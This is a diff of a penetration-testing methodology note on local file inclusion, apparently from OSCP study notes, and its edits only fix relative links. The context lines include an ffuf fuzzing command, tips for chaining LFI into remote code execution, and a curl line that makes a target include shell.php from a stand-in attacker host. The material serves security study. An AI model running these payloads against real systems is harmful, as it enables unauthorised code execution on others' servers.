@@ -455,7 +455,7 @@ ffuf -u 'http://target/?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddi
 > LFI -> RCE chain is a common foothold. Always attempt: (1) log poisoning,
 > (2) php://input or data:// if allow_url_include=On, (3) session file poisoning.
 >
-> See [../../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).
+> See [../../methodology/OSCP-Reporting.md](../../methodology/OSCP-Reporting.md).
 
 ---
 
@@ -493,7 +493,7 @@ curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
 - LFISuite: https://github.com/D35m0nd142/LFISuite
 - Kadimus: https://github.com/P0cL4bs/Kadimus
 
-> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../06%20Technologies/XXE.md), [File-Upload.md](./File-Upload.md)
+> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../07%20Vulnerabilities/XXE.md), [File-Upload.md](./File-Upload.md)
 
 ---
 
